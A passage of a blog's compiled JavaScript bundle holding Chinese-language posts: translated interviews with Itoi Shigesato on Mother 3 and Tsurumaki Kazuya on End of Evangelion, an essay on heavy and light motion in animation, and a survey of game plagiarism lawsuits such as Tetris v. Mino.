3》最直率的想法。</p>\n<p>糸井：或許令許多人失望的我說出這樣的話，可能會惹惱他們，但我個人對於能推出這部作品是非常開心的。因為這是我真的真的很想發表而製作的東西，所以我個人來說能夠推出就已經十分開心了。或許沒有前一次無法推出的經歷的話，就能夠更開心地通知各位，該怎麼說呢，現在就難免會有點顧慮的部份。</p>\n<p>——不過這對於單純在等著的人來說，還是件令人開心的消息呢。</p>\n<p>糸井：我十分感謝大家的等待，這也是對於我的鼓勵。不過我應該就不會大張旗鼓地做宣傳了。其實我認為在專欄連載中讓大家讀過《Mother》和《Mother 2》的故事之後，再來講《Mother 3》會比較好，但果然還是得先聊一次這個話題呢。</p>\n<p>——依照順序，首先是遊戲平台轉到了 Gameboy Advance 上。</p>\n<p>糸井：是的。我想許多不願放棄而持續等待著《Mother 3》的人們，會有個疑問是，這款遊戲真的有辦法塞進 Gameboy Advance 的規格裡嗎。的確我一開始的構想規格也是完全不同大小的。也有討論過「要不要把腳本出成書」或是「改編成電影」的可能性，而最後的結論是不可行。因為該說是規模嗎，我認為這在大小上是有所不同的，所以最後都棄案了。</p>\n<p>——這是為什麼呢？這點十分令人好奇。</p>\n<p>糸井：再簡明扼要點講的話，有次我收到了「採取在 Gameboy Advance 上推出的方法可行嗎？」的提案。這是我從未想過的事，當時我回答了「不知道」。因為我真的不知道。之後仔細思考過後。我才感受到，自己在不知不覺中陷進了大作主義之中。</p>\n<p>當時我的作法太過用力了，怎麼說呢，極端地點講，有點像是「我要翻轉這個世界」或是「把我能想像到的一切都放進去」的感覺，這樣才能稱得上是大作。想要推出大作，然後遇到了挫折。</p>\n<p>然後才開始覺得，是不是還有其它的路線可以尋求。雖然不能說是完全如此，但這樣的念頭是讓我決定在 Gameboy Advance 上推出《Mother 3》的理由之一。</p>\n<p>——有什麼因此改變想法的契機嗎。</p>\n<p>糸井：有蠻多的，其中一個是因為《Mother 1+2》要在 Gameboy Advance 上推出，我在做測試遊玩的時候。那讓我覺得，即使我不需要用上 3D 的角色，不用連續丟出十分精細的畫面，我也能讓玩家感受到我所構想的東西。</p>\n<p>可以說是 Gameboy Advance 主機的力量帶來的影響，把範疇放得更大點來講，也能說是環繞於遊戲四周的時代氛圍改變帶來的影響。現在已經不是不顧工作一味遊玩，或是徹夜沉浸於遊戲中的時代了。畢竟現在最困難的，就是「耗去包含我自己在內的，他人的時間」。</p>\n<p>所以我希望能做一款能夠在 Gameboy Advance 這種十分方便的主機上，每天稍微遊玩一點的遊戲。我在切換成這種思考方式後，開始製作《Mother 3》。</p>\n<p>——請在能透露的範圍內，和我們說說《Mother 3》會是款什麼樣的遊戲吧。</p>\n<p>糸井：遊戲故事會基於我的腳本製作。遊戲開發目前相當順利。以前我是抱持著日本職棒系列賽的冠軍決定賽的心情在製作，現在則像是開賽第一戰的放鬆態度。</p>\n<p>希望能是款讓玩家想著「今天玩到這邊就睡覺吧」，玩了一段後休息，之後再繼續玩，最後能夠說出「這還蠻有趣的耶？」的遊戲，所以也請大家抱持著這樣的想像，悠閒地等待吧。</p>\n<p>可能這樣說，有些人就會覺得「蛤～」，那也沒辦法。但回想起《Mother》和《Mother 2》，其實也有類似的元素。所以我希望《Mother 3》能夠是，當它完成時，我能夠笑著地說出「不要太期待啊！」的開心的遊戲。</p>\n<p>大家想必也想知道「什麼時候會發售呢！」、「會是什麼樣的遊戲呢！」，由於目前還在製作中，能夠發表的內容就是這些了。稍加詳細的經過則大概能在之後的專欄中讀到，就請大家繼續關注了。</p>\n<hr>\n<p>以上就是目前為止我們知道關於《Mother 3》的事了。雖然糸井重里在訪談中十分顧慮與謙遜、慎重地挑選著詞彙，在最後經過一段長考後，他這樣地說。</p>\n<p>「我會努力卸下自己肩上的重荷，能夠用自己的步伐向前進，還請大家多指教了。」</p>\n<p>下回開始就會依照當初的預定，連載糸井重里的《Mother》故事。裡頭會用著比本回輕快許多的心情，談論那款不可思議的遊戲裡究竟秘藏著些什麼，以及至今無人知曉的事情，敬請期待！</p>\n","date":"2020-11-15T22:23:20.000Z","excerpt":"","printDate":"November 15, 2020","printReadingTime":"1 min read"};

var route_37 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod10
});

var Mod11 = {"title":"【譯】《新世紀福音戰士》 舊劇場版 紅十字書 鶴卷和哉訪談","slug":"ACG-eoe-interview","html":"<p>—— 雖然是以劇場版的形式，《新世紀福音戰士》終於是完結了。您覺得如何呢？</p>\n<p>鶴卷＞覺得總算是結束了吧。其實我是覺得就保持 TV 版的形式結束會更美。說實話在那之後的工作都有點多餘的感覺。雖然一般來說能夠作成電影是件該高興的事情。</p>\n<p>—— 成品沒有因為花了時間而更加熟成嗎？</p>\n<p>鶴卷＞怎麼說呢。這次確實是有了足夠的時間，但以我自己來說，在作 TV 版時候的那種高昂感已經回不來了。不好意思作出了這樣消極的發言。因為那段時間，可以說是在我的人生裡情緒最高揚的時期了。</p>\n<p>—— 所謂的情緒高揚大概是怎麼一回事？</p>\n<p>鶴卷＞像是最後的感覺真的非常棒。在結束了第拾六話的作業時，尤其是在第貳拾話之後。當然身體已經殘破不堪、非常疲勞，但該說是只有腦袋還很清晰嗎，有種自己所持有的性能發揮到最大效率的感覺。</p>\n<p>—— 第拾六話是令人相當印像深刻的一話呢（註 1）。也是《新世紀福音戰士》的轉捩點。</p>\n<p>鶴卷＞因為那是首個開始呈現出描寫角色內在的方向性的章節。</p>\n<p>（註 1）：第拾六話「致死之病，之後」，A 段是和第 12 使徒的動作戲，B 段描寫了被封閉進使徒內部的真嗣，內心宇宙的糾葛。鶴卷負責這一話的分鏡、演出、設定輔佐。</p>\n<p>—— 那話是從一開始就預定好要描寫真嗣的內在嗎？</p>\n<p>鶴卷＞不。那話原本只是類似第拾、拾壹、拾貳話，會有許多使徒登場的章節之一。原本是打算在隨著整體使徒的謎團逐漸解開時，加入使徒開始對人類抱有興趣的章節。</p>\n<p>—— 原來如此。</p>\n<p>鶴卷＞在腳本的初稿裡，其實真嗣是會和使徒對話的。可是一旦使徒用著像是泡沫雜誌裡的宇宙人的詭異腔調，說出：「（清清喉嚨）像你這樣的類比式的思考方式是錯的」，就會讓人失去興致了吧，所以就改成了在本篇裡所使用的，和自己對話這個點子。</p>\n<p>—— 那段劇情裡有一句「只做著自己喜歡的事情，是不可能活得下去的…」的台詞對吧。那句台詞相當地強烈呢。我原本很希望有動畫迷會因為那句台詞而感到衝擊，但卻沒什麼人有反應（笑）。</p>\n<p>鶴卷＞因為觀眾在看電視動畫的時候都不會仔細地去聽台詞啊。或者該說，即使聽到了也不會進到腦袋裡面。我也是這樣。嗯，庵野秀明也是知道這件事，所以開始加入了更直接地將訊息傳達給觀看者的表現。在那之前都還是在作品的故事範圍內表現的形式，之後越來越向後退，對於自己的反省和透露心情的表現開始變多。</p>\n<p>—— 在那之前，你們都還是打算透過真嗣的轉變去描寫主題，之後卻變成了更直接性的訊息。</p>\n<p>鶴卷＞正好是在作第拾六話的時候，庵野秀明同時在做著第拾四話的作業。在第拾四話有句綾波零的如詩般的台詞吧（註 2）。在那之後《EVA》的方向性就浮現出來了。要朝向那種反省性的故事。所以第拾六話的 A 段還是普通的故事。就這層意義來說，第拾六話的 A 段和 B 段的分段或許就是《新世紀福音戰士》外側和內側的對折線。</p>\n<p>（註 2）：第拾四話「SEELE，魂之座」B 段的開頭，零以詩般的獨白談論自己的內在。</p>\n<p>—— 您對於 TV 版後半的發展有何看法？</p>\n<p>鶴卷＞我並不討厭。行程已經出現問題，作畫張數也在往下掉，就品質來說是有令人惋惜的地方，但被絕望所逼趕的製作人員的緊張感，的確有呈現在影像上。</p>\n<p>—— 原來如此。</p>\n<p>鶴卷＞當整個製作體制開始出現問題時，也是有人提出「如果沒辦法做出能夠滿意的東西，就沒有繼續製作下去的意義」的意見，但我並不這樣想。「連同變得糟糕的過程一同展示出來也可以啊」。這是個包含了我們做不出滿足的東西這件事的作品。「但過了十年後，再回來看當時我們酩酊大醉所做出來的東西，即使品質很糟糕，也不會覺得不悅」我是這樣想的。</p>\n<p><img src=\"https://i.imgur.com/Q2plVvM.jpg\" alt=\"page 1\"></p>\n<p>—— 是這樣子啊。</p>\n<p>鶴卷＞所以，不論最後形式如何，我很高興能將 TV 版全部作完。</p>\n<p>—— 結果，完結篇變成了電影版，並採取了分為春天和夏天 2 集公開的形式。</p>\n<p>鶴卷＞在知道春天還不會完結，要等到夏天的時候，很讓人錯愕呢。連在春天的電影院裡觀看的人都這樣想，令我覺得更加沮喪。也讓「果然這樣做是多餘的吧？」的疑問再次出現。真的是相當衝擊。</p>\n<p>—— 在這次的『THE END OF EVANGELION』裡您是負責監督的職位。</p>\n<p>鶴卷＞雖然名義上是監督，但做的事情和 TV 版的各話演出是一樣的。所以實務上算是第 25 話部份的演出。</p>\n<p>—— 關於最終話則不做評論嗎？</p>\n<p>鶴卷＞以監督的職位來說我什麼都沒做。頂多是在緊急時刻幫忙針刻膠卷（シネカリ）而已。</p>\n<p>—— 製作第 25 話的時候有什麼感想嗎？</p>\n<p>鶴卷＞並沒有說因為要製作電影版，就特別提起勁來，還是用和在做 TV 版時同樣的感覺在製作。覺得會不想要特地意氣用事。</p>\n<p>—— 所以在製作的時候是很放鬆的嗎？</p>\n<p>鶴卷＞只有在第壹、貳話的時候比較帶著勁吧。雖然是這樣說，整個製作還是蠻辛苦的。</p>\n<p>—— 有什麼特別喜歡的場景，或是下了相當大心血的場景嗎。</p>\n<p>鶴卷＞貳號機的左眼被槍刺中的場景。很難表現出那種似乎很痛的感覺，但這段只看了樣本影帶（ラッシュフィルム）就覺得非常成功。很少能有這樣的情況。</p>\n<p>—— 話說，《新世紀福音戰士》這部作品，常被說基本上是投影庵野監督的內心景像所製作出來的。在參與這樣的作品時，鶴卷先生自己沒有過，對於庵野監督的作法或思考方式無法接受的時候嗎？</p>\n<p>鶴卷＞我認為擔任監督的人，都應當要擁有這樣子的部份。有了這種部份的作品才會有趣。所以那些掛著所謂的娛樂的作品，在這層意義上，對我來說並不是娛樂作品。</p>\n<p>—— 所以，您是接受這點而參加製作的。</p>\n<p>鶴卷＞當然。只是，雖然是這樣說，要說我能否和真嗣的心情有所同感的話，倒不是如此。而要說我是否能接受真嗣的心情＝庵野秀明的心情，我想也不是。</p>\n<p>—— 原來如此。所以，真嗣的心情就是庵野監督的心情這件事，其實是沒錯的嗎。</p>\n<p>鶴卷＞實際上如何我並不曉得。但我是帶著這樣的想法在製作的。所以在腳本會議裡也曾經講過數次像是「真嗣講出這種話會不會太帥氣了？ 庵野秀明並沒有這麼帥氣吧」的話。</p>\n<p>—— 在第 25 話裡真嗣已經完全喪失心神。所以庵野監督也是變成了那樣子嗎？</p>\n<p>鶴卷＞在 TV 版結束之後的庵野秀明，情緒就是低落成像那樣子。</p>\n<p>—— 對於真嗣心情的轉變，在看完第貳拾四話之後，直接去看電影版的第 25 話似乎會有種怪異感。</p>\n<p>鶴卷＞心情上的轉變或許是這樣。因為製作者的心情是從第貳拾四話之後，過了快一年才開始製作第 25 話的。</p>\n<p>—— 也就是說，這次的劇場版，是貼合現在庵野監督的心境所作出來的嗎。</p>\n<p>鶴卷＞我認為是。在某個時期，庵野秀明自己也曾經明確地嘗試走向更加療癒的劇情發展。但最後沒能達成。我認為他沒有說謊。</p>\n<p>—— 所謂的說謊是，例如說，讓結局突然變成「愛拯救了地球」之類的劇情嗎。</p>\n<p>鶴卷＞是的。這次並沒有變成如此。我對於這個結局沒有不滿。我非常地喜歡。</p>\n<p>—— 這次電影的結局，真嗣內心的問題姑且算是得到了清算。</p>\n<p>鶴卷＞我個人的想法是，這個結局是「這種內心的問題，是一定得被補完的東西嗎？」。不論補完了或沒補完，擁有煩惱或沒有煩惱，找到了答案或找不到，人際關係還是存在著，世界也會繼續前進。而且，人生不會就此結束。雖然也許其實並不是這樣。</p>\n<p>—— 就這個結局來看的話，說到底《新世紀福音戰士》其實就是溝通的故事呢。</p>\n<p>鶴卷＞這點從 TV 版開始就是如此了。我們在第貳話的時候就有相當地意識這點去做演出。</p>\n<p>—— 哦哦，有段美里和真嗣在公寓裡互相探測彼此距離的對話劇情對吧。雖然兩人看起來是明朗開心地相處著，但真嗣會想著「雖然她是個好人…」，而美里會想著「是不是被看穿了」。</p>\n<p>鶴卷＞第貳話裡還有美里向真嗣搭話，卻不進到房間裡，之類的。第參話裡也是有像是早晨的日常生活對話，彼此沒有對上臉。僅只是透過狹小地打開的隔間互相連繫。真嗣和零之間，以及真嗣和源堂之間也是如此。彼此之間有著距離，擁有許多不圓滑的溝通。</p>\n<p>—— 原來如此，所以整部作品的主題都是一樣的嗎。</p>\n<p>鶴卷＞是的。</p>\n<p>—— 現在回顧《新世紀福音戰士》有什麼想法？</p>\n<p>鶴卷＞我果然還是喜歡在製作 TV 版時的那種空氣吧。就只有 TV 版能夠在製作的途中得到反應。像是「今天客人的反應很差」，或是「哦，今天反應很熱烈呢」之類的。這種反應會回饋到當時正在製作的話數裡。在這層意義上而言，也可以說是種 LIVE 感覺。在電腦連線上愚蠢的批評，或是次文化雜誌上幾乎接近捧殺程度的稱讚方式，雖然庵野秀明本人是感覺相當糟糕的吧，《新世紀福音戰士》就是包含這類被誤解的部份在內的，『溝通的故事』。</p>\n<p><img src=\"https://i.imgur.com/Jq1eIPF.jpg\" alt=\"page 2\"></p>\n<p>—— 直到現在，居酒屋裡的上班族還是會對《EVA》的謎題進行爭論呢（笑）</p>\n<p>鶴卷＞（笑）。例如說，庵野秀明不是說過「動畫粉絲不能再自我縮限（内側向いててイカン）」嗎。「必須要再外向一點」。就這點來說，有不是動畫粉絲的人願意觀看這部作品，是件讓人很高興的事情。但到頭來《新世紀福音戰士》＋庵野秀明對於《新世紀福音戰士》的評論，其實是給予包含他，當然也包含我在內的動畫粉絲的訊息。所以其實動畫粉絲之外的人看了也沒有幫助。這是部普通地生活著、普通地溝通著的人看了也無法瞭解的作品啊。</p>\n<p>—— 可是現在觀看《新世紀福音戰士》的人，其實大家都有一部份類似動畫粉絲的地方吧？無法妥善地處世的焦躁感，也許是每個人都會有的。</p>\n<p>鶴卷＞哦哦，也許是這樣子呢。確實就從動畫粉絲這個小範疇來看，就如同庵野秀明所說的，但退一步以日本人這個範疇來看，說不定大家也有同樣的問題。而不只是特別在動畫粉絲身上才有的問題。</p>\n<p>—— 最後，有什麼想要給大家的訊息嗎。</p>\n<p>鶴卷＞請不要太退縮，去找到下一件開心的事情吧。</p>\n<p>—— 這是說，不要一直執著在《新世紀福音戰士》上的意思嗎？</p>\n<p>鶴卷＞是的。讓這一切簡單地結束會更美麗吧。</p>\n<p><img src=\"https://i.imgur.com/B3X63jZ.jpg\" alt=\"page 3\"></p>\n","date":"2019-01-19T06:35:02.000Z","excerpt":"","printDate":"January 19, 2019","printReadingTime":"1 min read"};

var route_47 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod11
});

var Mod12 = {"title":"【譯】厚重的表現、輕盈的表現（關於金田伊功成品的思考）","slug":"ACG-expression-of-light-and-heavy","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://animenodanmen.blogspot.com/2009/07/blog-post_31.html\">https://animenodanmen.blogspot.com/2009/07/blog-post_31.html</a></p>\n<hr>\n<p>當我們想在動畫裡表現出厚重的感受時，有種方法是增加 1 秒鐘裡使用的繪畫張數。</p>\n<p>基本上電影一秒鐘會有 24 張（格），電視一秒鐘會有 30 張（幀）的畫面，而動畫大多是一秒鐘使用 8 張畫呈現。例如行人站立或坐下這種日常的舉動多落在這個張數。奔跑時則會在一秒鐘用上 12 張畫。這是俗稱的一拍二（２コマ打ち），在攝影時讓一張畫停留兩格構築出一秒鐘的畫面。一秒鐘只用 8 張畫時則是叫做一拍三（３コマ打ち）。如果要從為什麼一秒鐘裡奔跑和行走用到的張數不同開始說起，那會變成長篇大論，所以我們先暫且不提。</p>\n<p>一拍二比起一拍三，以及一拍一比起一拍二在一秒鐘裡所用到的繪畫張數會更多，並更容易讓人感受到重量。這是因為眼睛接受到更多的畫面，腦對於動靜的認識就會更深刻。(當然，表現出厚重感的要素不是只有張數的多寡）反過來說，想表現出輕盈的感覺就有必要減少使用的繪畫張數。</p>\n<p>超高速攝影（Slow Motion）是個很好的例子。例如超高速攝影拍攝到肥皂泡泡破掉的影像，會比實際的肥皂泡泡破掉更有種黏著的厚重感。即使把播放速度調整到和實際一樣的速度（例如超高速攝影在一秒鐘裡拍到了一千張畫面，就調整成在一秒鐘裡播放完這一千張畫面），還是會比肉眼觀看時有更厚重的感覺。因為超高速攝影所拍攝到的全都是定格（Stop Motion）的。肉眼在觀看高速移動時的是流動的，就像在電車裡觀看附近的牆壁、磚瓦、柱子一樣。但高速攝影的每一格畫面並不是如此，反而非常清晰。也就是它拍攝到的是實際上人類無法看見的移動。</p>\n<p>動畫的畫面和高速攝影拍攝到的畫面很像。每一張畫都是定格，基本上沒有流動的畫面。當然也能做出模擬的表現手法，但那還是和肉眼所看到的東西不一樣。動畫的畫面動態會讓人覺得很過癮，就是定格所造成的，因為我們能看見肉眼所看不見的東西。但看到的資訊量太多反而會覺得不舒服。例如前面提到的奔跑，通常一秒鐘會用 4 張畫，裡面不會有兩隻腳同時離地的畫。實際上當然會有兩腳都離地的瞬間，但把那放進動畫裡就會顯得很多餘，會無法成功表現出奔跑的輕快感，所以大多情況下不會放進兩腳同時離地的畫。這和動畫的畫實際上是定格的有非常大的關係。</p>\n<p>日本動畫和歐美動畫最大的差異點就在於，日本動畫會為了表現出輕盈感，而將畫面隱藏（見せない絵をつくる）。迪士尼的手繪動畫基本上都是全動畫（Full Animation，盡可能忠實於自然狀態的表現形式）。是預想好每一格每一格應該如何移動所製作的，所以會和輕盈的日本作品不同，有種獨特的滑柔濕潤的沉重感。而即使現在的日本動畫採用全動畫（一拍一，１コマ打ち）製作，因為已經發展出了輕盈表現的技術，骨子裡的思維還是和迪士尼完全不同的。這並不是在談孰優孰劣，而是這兩者已經是不同的東西了。已經逝世的金田伊功先生正是位在表現輕盈上非常優秀突出的動畫師。他是位對於表現輕盈留下了十分巨大影響的人。也是察覺到現今動畫基石的其中一人。</p>\n<iframe width=\"560\" height=\"315\" title=\"yoshinori kanada mad\" src=\"https://www.youtube.com/embed/Fv7qCcm1qTA\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n","date":"2020-07-05T21:34:02.000Z","excerpt":"","printDate":"July 5, 2020","printReadingTime":"1 min read"};

var route_23 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod12
});

var Mod13 = {"title":"遊戲抄襲系爭事例","slug":"ACG-game-contention-history","html":"<p>近期《原神》正式上市後，過去的各種風波重燃，讓各地網路社群再次掀起一波口水戰，自引用、致敬、抄襲的界線究竟在哪，到鄉民心中的「最強法務部」公司任天堂為何在這眾怒難息的時間點卻毫無動作，還讓原神通過了 Switch 的上架審核，只見叫戰怒罵、譏諷，卻毫無共識、討論空間。</p>\n<p>先不論所謂最強法務部只是種刻版印象，實際上任天堂在遊戲上的利益／專利爭取偏向消極（見例 6），以及要詳細搜證、走到實際法律行動並不只是如網路上發文叫戰這麼簡單，不行動並不是默認，而更可能是「苦無證據」；許多爭點在《龍族拼圖》與《神魔之塔》或是網路繪圖的相關事例都已經討論到快爛掉，但個人認為其中相當重要的一角，卻鮮見於此，那就是「遊戲抄襲遊戲的案例中，實際上過法院，並且有做出判決的『抄襲』」，究竟是什麼樣子的？</p>\n<p>但礙於本人並非法律專業，內文專門用語或語順上可能會有錯誤或出入，這邊指的「抄襲」也只是一般大眾常見用語，非法律中實際判定的「複製」、「改作」、「專利」、「商標」...etc.，以及各國相關規範、法條、民情、時空背景亦會有所不同，故本文目的並非提出一種絕對的標準或答案。有相關修正意見或指正、資料遺漏都歡迎提出；並且也為了閱讀方便與所耗時間，並不會詳細列舉出所有內容，各篇資料來源都附於副標下方。</p>\n<h2 id=\"1-1981-年-美國-atari-《asteroids》-控訴-acornsoft-《meteors》-敗訴\">1. 1981 年 美國 Atari 《Asteroids》 控訴 Acornsoft 《Meteors》 敗訴</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://daily.zhihu.com/story/3136490\">為什麼說 2014 年會是手游侵權訴訟的大年？</a>（中國網站）</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://ip.people.com.cn/n1/2017/1219/c136680-29715456.html\">如何保護電子遊戲著作權？</a>（中國網站）</li>\n</ul>\n<p><img src=\"https://i.imgur.com/ogBf1za.jpg\" alt=\"pic 1\"></p>\n<blockquote>\n<p>Atari 《Asteroids》</p>\n</blockquote>\n<p><img src=\"https://i.imgur.com/T8FsjOF.png\" alt=\"pic 2\"></p>\n<blockquote>\n<p>Acornsoft 《Meteors》</p>\n</blockquote>\n<p>本案應為世界上首次將電子遊戲做為影音作品受著作權保護的相關案例，雖然列舉出了二十二項相同之處與九項不同之處，法庭認為由於使用 BASIC 語言撰寫、表現手法之限制，兩者遊戲的大量相似之處是「不可避免」的，因而即使採用了相同的符號與標記，搭配上不同的移動方式與聲光表現後，仍可視為不同的表達方式，故判決為沒有侵犯著作權。</p>\n<h2 id=\"2-米国判例にみるビデオゲームの米国の著作権の保護範囲\">2. <a target=\"_blank\" rel=\"nofollow\" href=\"http://jp.youme.com/sub_news/ipboardopen.aspx?idx=1008\">米国判例にみるビデオゲームの米国の著作権の保護範囲</a></h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.netlawcn.net/second/content.asp?no=1913\">視頻遊戲作品所包含的藝術類著作權</a>（中國網站）</li>\n</ul>\n<h3 id=\"1982-年-美國-任天堂《donkey-kong》-控訴-falcon-《crazy-kong》-侵犯著作權-勝訴\">1982 年 美國 任天堂《Donkey Kong》 控訴 Falcon 《Crazy Kong》 侵犯著作權 勝訴</h3>\n<p><img src=\"https://i.imgur.com/j3CjdbC.png\" alt=\"pic 3\"></p>\n<blockquote>\n<p>左圖為任天堂《Donkey Kong》，右圖為 Falcon 《Crazy Kong》</p>\n</blockquote>\n<p>法庭認為被告遊戲的角色外觀、角色職能、角色表現皆與原告遊戲相同，判決被告遊戲侵犯了原告遊戲的著作權。</p>\n<h3 id=\"1982-年-美國-atari-《pac-man》-控訴-飛利浦《kc-munchkin》\">1982 年 美國 Atari 《Pac-Man》 控訴 飛利浦《K.C. Munchkin》</h3>\n<p><img src=\"https://i.imgur.com/1cO1gIU.jpg\" alt=\"pic 4\"></p>\n<blockquote>\n<p>左圖為 Atari 《Pac-Man》，右圖為飛利浦《K.C. Munchkin》</p>\n</blockquote>\n<p>進入與離開出入口的設定仍在可預見的設計範圍內，被告遊戲的控制角色吃下藥劑後有 5 秒鐘可以追趕幽靈的設定，以及變身後的表情變化都與原告遊戲相似，於表達上具有相似性，因此法庭判定 K.C. Munchkin 侵範了 Pac-Man 於藝術表現上的著作權。</p>\n<h3 id=\"1994-年-美國-capcom-《street-fighter》-控訴-data-east-《fighters-history》\">1994 年 美國 Capcom 《Street Fighter》 控訴 Data East 《Fighter&#39;s History》</h3>\n<p><img src=\"https://i.imgur.com/Tkun5Id.jpg\" alt=\"pic 5\"></p>\n<blockquote>\n<p>左圖為 Capcom 《Street Fighter》，右圖為 Data East 《Fighter&#39;s History》</p>\n</blockquote>\n<p>由於原告遊戲表現為低原創性、容易想見的設定，戰鬥動作亦不符合藝術性的表現，僅有魔術動作符合此一標準，但被告遊戲中並無此動作，故此案判決為無侵害著作權。</p>\n<h3 id=\"簡略統整\">簡略統整</h3>\n<ol>\n<li><strong>遊戲概念</strong>、規則、功能：原則上不是保護對象。但亦有具有創意性的組合遊戲規則做出表現時的例外，若能在這點上做出區分、強調具有創作性的表現時，至少能夠保護創作性的表現部份（下述的 Tetris 案例）。</li>\n<li><strong>遊戲的構成、設定構造</strong>：當其十分表現出創作性的表現時則有保護的可能，若是遊戲設定越特異，角色的創作性表現保護範圍便會越廣。</li>\n<li><strong>角色美術</strong>：對於以前未曾出現過的角色的相似仿製案例，有保護的可能（Donkey Kong 案例）。</li>\n<li><strong>角色動作</strong>：角色可做出的動作，亦或是於限定狀況中做出的表現雖然難以受到保護，但難以預測的奇異動作或是表現則有受保護的可能（如 Street Fighter 的魔術動作雖然是具有創作性的表現，一般的戰鬥動作則非具有創作性的表現）。</li>\n</ol>\n<h2 id=\"3-2006-年-韓國-ccr-《瘋狂坦克-2-》-控訴-softnyx-《gunbound》-假處分\">3. 2006 年 韓國 CCR 《瘋狂坦克 2 》 控訴 Softnyx 《Gunbound》 假處分</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.ritsumei.ac.jp/acd/cg/law/lex/06-5/suh.pdf\">ゲームと著作権の侵害</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/O7FjBbq.jpg\" alt=\"pic 6\"></p>\n<blockquote>\n<p>Softnyx 《Gunbound》</p>\n</blockquote>\n<p><img src=\"https://i.imgur.com/Ua5da1g.jpg\" alt=\"pic 7\"></p>\n<blockquote>\n<p>CCR 《瘋狂坦克 2 》</p>\n</blockquote>\n<p>在韓國，著作權法的保護對象是，於學問或藝術上由精神的努力得來的思想、感情，透過語言、文字、聲音、色彩轉化成具體的外部表現的「創性作的表現」。著作物則依表現的形式分為語文著作物、音樂著作物、演劇著作物、美術著作物、建築著作物、照片著作物、影像著作物、圖像著作物、電腦程式著作物這九大類。裡頭並沒有遊戲著作物這種分類，但遊戲也能做為文學、藝術，亦或是從屬於藝術的範圍，做為表現思想和感情的著作物受到著作權法的保護。</p>\n<p>（中略）剽竊（plagiarism）一般指未經允許使用他人作品的行為，是個與著作權有相當緊密關係的概念，但這並不是現行著作權法或電腦程式保護法中的用語，相對的概念是未取得如對方允許這類的正當權限，便複製或修改（製作二次性的著作物或是修改程式著作物的內容）的行為。也就是直接將他人的著作物全部或其中一部份，依實地加上變更後做為自己的著作物發表、使用的行為。但在廣義的社會概念中，借用他人的點子，到模仿、盜用都會被認為是剽竊行為。</p>\n<p>（中略）《瘋狂坦克 2》 v. 《Gunbound》事件是首個遊戲著作物出現著作權侵害問題的案例，然而本案僅是假處份案件，並未作出正式判決。</p>\n<p>（中略）法庭將申訴人主張侵害著作權的部份簡略分為可辨識出創作性的部份，以及無法辨識出創作性的部份。</p>\n<p>首先，《瘋狂坦克 2》中遊戲性的重要要素，和之前的遊戲有相同或類似的表現，有十分空間可認為這是反映以前製作的遊戲中使用過的要素而製作出來的，在這點上法庭對於獨創性的認定是站在否定立場的。</p>\n<p>第二，法庭認為《瘋狂坦克 2》中表現的一部份要素含有獨創性，被申訴人也承認這部份要素出現於自己製作的《Gunbound》之中，雖然可認為這是部份認定遊戲概念的創作性與實質的相似性相關連的判例，然而因為其滿足充份性假處份的性質，而放棄了假處份的申請。法庭認為本案中的遊戲所使用的一部份點子，是受限於電腦這種表現媒體的極限性，只能使用特定的形態表現，因而對於其是否有受到著作權法保護的價值感到疑問，並且依據發出假處份後相較 CCR 所能獲得的利益並不大，但 Softnyx 卻會受到較大的損失，於保護權利的必要性上做出此判決。</p>\n<p>第三，對於申訴人和被申訴人的遊戲中的一部份表現，即使不去判斷其中是否含有創作性，依然難以看出兩者是為同一或擁有類似性。</p>\n<h2 id=\"4-2009-年-美國-tetris-holding-《俄羅斯方塊》-控訴-xio-interactive-《mino》-勝訴\">4. 2009 年 美國 Tetris Holding 《俄羅斯方塊》 控訴 Xio Interactive 《Mino》 勝訴</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.naipo.com/Portals/1/web_tw/Knowledge_Center/Infringement_Case/publish-86.htm\">手機軟體遊戲之保護：以俄羅斯方塊案為例</a>（推薦直接閱讀原文）</li>\n</ul>\n<p><img src=\"https://i.imgur.com/IEPZsfQ.jpg\" alt=\"pic 8\"></p>\n<p>本案一審在紐澤西聯邦地區法院進行。被告 Xio 坦承為了開發 Mino 這款遊戲，確實從 iPhone 上下載了「俄羅斯方塊」（Tetris）這款遊戲。但是，Xio 認為，其並沒有複製任何受著作權保護的元素。 而且，其主張，其所複製的元素，都不是原創性表達（original expression），它們只是遊戲的內容，包括 1. 規則（rule）、2. 功能（function）和 3. 為了達到該遊戲規則與功能而必要的表達（expression）（故不受著作權法保護）。</p>\n<p>而且，Xio 認為在設計 Mino 遊戲前，就已經仔細研究作著作權法，並且也跟律師一起研究過。根據他們的研究認為，他們可以自由複製「遊戲的規則」以及「遊戲的功能」。Xio 承認其當初就是想要設計一款模仿「俄羅斯方塊」的遊戲，但其認為，Mino 遊戲與俄羅斯方塊遊戲近似的部分，都不受著作權保護。而他們乃重新用自己的程式碼，亦即使用自己的表達，重新寫出了 Mino 這款遊戲。</p>\n<p>關於電腦程式侵權的判斷，一直都是著作權侵權判斷領域中最複雜的一塊。以下先簡單介紹本案會需要用到的基本著作權法知識。</p>\n<p>（1）概念／表達二分法（Idea-Expression Dichotomy）</p>\n<p>所謂的概念／表達二分法，亦即著作權法不保護概念（idea），只保護表達（expression）。在電腦程式著作方面，程式原始碼當然屬於表達，而程式的架構、系統，可能就屬於概念部分而不受保護。但是，電腦程式執行時的畫面或視聽呈現內容（audiovisual display），也屬於表達部分，也會受到著作權法保護。</p>\n<p>（2）概念與表達合併原則</p>\n<p>另外，在探討電腦軟體著作保護範圍時，也常被提出的二個原則，一為「概念與表達合併原則」（Doctrines of Merger），一為必要場景原則（Scènes à Faire）。所謂「概念與表達合併原則」，是指當某一概念只有唯一或少數的表達方式，而兩者合併，則若保護該表達，則必然保護該概念。為了不讓作者可以獨占該概念，所以也不保護該表達方式。</p>\n<p>（3）必要場景原則</p>\n<p>至於所謂的必要場景原則（scènes à 